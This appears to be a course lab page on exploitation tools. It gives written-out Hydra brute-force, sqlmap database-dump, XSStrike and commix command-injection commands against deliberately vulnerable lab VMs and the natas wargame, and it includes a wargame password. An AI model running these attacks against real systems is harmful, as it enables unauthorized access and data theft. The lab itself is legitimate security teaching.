
<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
<meta name="theme-color" content="#4F7DC9">
<meta charset="UTF-8">
<title>6.4: Exploitation tools (Pt 1)</title>
<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
<style>
.success{color:#1e8e3e}.error{color:red} </style>
</head>
<body>
<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
<google-codelab codelab-gaid="" id="W6.4_exploit1" title="6.4: Exploitation tools (Pt 1)" environment="web" feedback-link="https://docs.google.com/document/d/16XyONjg3yGjqRDxAJoYPo5I3lOgANTHvz6gzRDxcJpo">
<google-codelab-step label="hydra" duration="2">
<p class="image-container"><img style="width:177.5px" src="img/ad3db4624743bd83.png"></p>
<p>On the Kali VM, find the Mirai username and password lists within the <code>/usr/share/wordlists/metasploit</code> directory.</p>
<p>Then, use Hydra to automatically search for the credentials of the Authentication #1 level of WFP2.</p>
<ul>
<li>Use the <code>-e s</code> setting to check for usernames that are also passwords for an account</li>
<li>Use the <code>-L</code> &lt;<code>mirai_username_file</code>&gt; to specify a file of usernames</li>
<li>Use the <code>-P</code> &lt;<code>mirai_password_file</code>&gt; to specify a file of passwords</li>
<li>Finally, specify the target. HTTP GET URLs can be specified as <code>http-get://</code>&lt;<code>wfp2_internal_IP</code>&gt;<code>/authentication/example1</code> where <code>wfp2_internal_IP</code> where has the form of <code>10.x.y.z</code> </li>
</ul>
<pre><code>hydra -e s -L &lt;mirai_username_file&gt; -P &lt;mirai_password_file&gt; \
  http-get://&lt;wfp2_internal_IP&gt;/authentication/example1</code></pre>
<ul>
<li><strong>Show a screenshot of the result.</strong></li>
</ul>
<p>Re-run command using the <code>-V</code> flag to see the list of credentials checked</p>
</google-codelab-step>
<google-codelab-step label="sqlmap" duration="10">
<p><a href="http://sqlmap.org/" target="_blank">sqlmap</a> is an industry standard tool for automatically discovering and exploiting SQL injection vulnerabilities. We will be using some of the common functionality it provides to compromise vulnerable applications. A useful guide to the tool can be found in this <a href="https://cdn.comparitech.com/wp-content/uploads/2021/07/sqlmap-Cheat-Sheet.pdf" target="_blank">cheat sheet</a>.</p>
<h2 is-upgraded><strong>SQL Injection #1 (WFP1)</strong></h2>
<ul>
<li>From the Kali VM, run <code>sqlmap</code> on first SQL injection example on the WFP1 VM via <code>wfp1_internal_IP</code> (in the form of <code>10.x.y.z</code>).</li>
</ul>
<pre>sqlmap -u &#39;http://&lt;wfp1_internal_IP&gt;/sqli/example1.php?name=root&#39; --batch --dbms mysql --dump</pre>
<ul>
<li><strong>Show screenshots of the injection points discovered and the payloads used to exploit them</strong></li>
<li><strong>Show the dump of the user table</strong></li>
</ul>
<h2 is-upgraded>SQL Injection #2 (WFP1)</h2>
<p>In this exercise, spaces are removed. One can use built-in tamper scripts in <code>sqlmap</code> to substitute other white space characters such as <code>tab</code> or <code>newline</code>. In addition, <code>sqlmap</code> can dump the entire database using blind injection with a time-based metric.</p>
<ul>
<li><strong>Show a screenshot of the output of running against the white-space filtered exercise using the tamper module </strong><strong><code>space2randomblank</code></strong><br></li>
</ul>
<pre>sqlmap -u &#39;http://&lt;wfp1_internal_IP&gt;/sqli/example2.php?name=root&#39; --dbms mysql --dump --tamper=space2randomblank</pre>
<h2 is-upgraded><code>natas15</code> Blind SQL Injection</h2>
<p>In this exercise, the server code below queries the backend database table to determine if a user exists. Unfortunately, it is injectable. While it will not give out any contents of the database directly, it is vulnerable to a blind attack.</p>
<p class="image-container"><img style="width:578.09px" src="img/8c45d1d005c7546c.png"></p>
<p>One can write a Python program (as you did in Program #2) to find the password for natas16 and as described in the course slides. However, <code>sqlmap</code> can perform the attack automatically for you.</p>
<p>Solve this level via <code>sqlmap</code> by issuing the following</p>
<pre>sqlmap -u &#39;http://natas15.natas.labs.overthewire.org&#39; --auth-type basic --auth-cred natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB --data username=foo --dbms mysql --dump --level 2 --batch --time-sec 1</pre>
<ul>
<li><strong>Show a screenshot of the result</strong></li>
</ul>
<p>The meaning of the flags is as follows:</p>
<ul>
<li>&#39;<code>--auth-type</code>&#39;, &#39;<code>--auth-cred</code>&#39;: Lets <code>sqlmap</code> log into the challenge via Basic-Auth</li>
<li>&#39;<code>--data</code>&#39;: Tells sqlmap that you want it to try to inject into the POST parameter username.</li>
<li>&#39;<code>--dbms</code>&#39;: For efficiency, tell <code>sqlmap</code> the backend.</li>
<li>&#39;<code>--dump</code>&#39;: Dump the all the information in all tables.</li>
<li>&#39;<code>--level</code>&#39;: Setting this above 1 (max 5) tells sqlmap to try more attack-types and payloads. The payload we need isn&#39;t included at level 1, so we&#39;ll set this to 2.</li>
<li>&#39;<code>--batch</code>&#39;: Tells sqlmap not to prompt us with questions, and just use the default behavior.</li>
<li>&#39;<code>--time-sec</code>&#39;: Sleep time to inject when doing timing-based attacks. You might need to raise this if your connection to the natas server is overloaded.</li>
<li>The attack takes about ten minutes to run, much of which is due to sqlmap dumping the entire user database with a time-based attack.</li>
</ul>
</google-codelab-step>
<google-codelab-step label="xsstrike" duration="10">
<p><code>XSStrike</code> is a tool that discovers sites that are vulnerable to cross-site scripting attacks. On the Kali VM, install the tool:</p>
<pre><code>git clone https://github.com/s0md3v/XSStrike
cd XSStrike
virtualenv -p python3 env
source env/bin/activate
pip3 install fuzzywuzzy requests</code></pre>
<p>Then, perform a scan on the XSS URL in the WFP1 VM via <code>wfp1_internal_IP</code></p>
<pre><code>python3 xsstrike.py -u &#34;http://&lt;wfp1_internal_IP&gt;/xss/example1.php?name=hacker&#34;</code></pre>
<ul>
<li><strong>Show a screenshot of the payload that </strong><strong><code>xsstrike</code></strong><strong> finds that exploits the vulnerability with a high efficiency.</strong></li>
<li><strong>In a web browser, substitute the payload as the URL parameter and trigger the XSS. Show a screenshot of the successful exploit.</strong></li>
</ul>
<p>Visit the XSS Firing Range at <a href="http://public-firing-range.appspot.com/" target="_blank">http://public-firing-range.appspot.com/</a>. Within the site are a set of XSS vulnerability categories (e.g. DOM XSS, Reflected XSS, URL-based DOM XSS...). For three different categories, find a URL that XSStrike is able to reveal a vulnerability for (e.g. one with a high efficiency score). Note that some URLs will require a URL-parameter to be set. For example, within the Reflected XSS category, XSStrike finds:</p>
<p class="image-container"><img style="width:624px" src="img/25ba2f5c9a437136.png"></p>
<ul>
<li><strong>Show a screenshot of each payload and the URL it exploits</strong></li>
</ul>
</google-codelab-step>
<google-codelab-step label="commix" duration="3">
<p>Commix is a tool that discovers sites that are vulnerable to command-line injection. One can either obtain the latest version via Github or use it directly on the Kali VM.</p>
<h2 is-upgraded><strong>Option #1 (from source)</strong></h2>
<pre><code>git clone https://github.com/commixproject/commix.git</code></pre>
<p>Change directories into the repository and perform a scan on the command injection URL in the WFP1 VM via <code>wfp1_internal_IP</code></p>
<pre><code>cd commix
python commix.py --url=&#34;http://&lt;wfp1_internal_IP&gt;/commandexec/example1.php?ip=127.0.0.1&#34; --level=1</code></pre>
<h2 is-upgraded><strong>Option #2 (on Kali VM)</strong></h2>
<p>On the Kali VM, run the tool directly against the WFP1 VM via <code>wfp1_internal_IP</code></p>
<pre><code>commix --url &#34;http://&lt;wfp1_internal_IP&gt;/commandexec/example1.php?ip=127.0.0.1&#34; --level=1</code></pre>
<h2 is-upgraded><strong>Output</strong></h2>
<ul>
<li><strong>Show a screenshot of the payload that the tool finds to discover the vulnerability. </strong></li>
</ul>
<p>Once found, commix will invoke a shell and offer it to you. Say yes to the shell and it will drop you into it.</p>
<ul>
<li><strong>Perform an </strong><strong><code>'ls'</code></strong><strong> and a </strong><strong><code>'pwd'</code></strong><strong> and show the results in screenshots showing you have obtained access.</strong></li>
</ul>
</google-codelab-step>
</google-codelab>
<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
<script src="//support.google.com/inapp/api.js"></script>
</body>
</html>
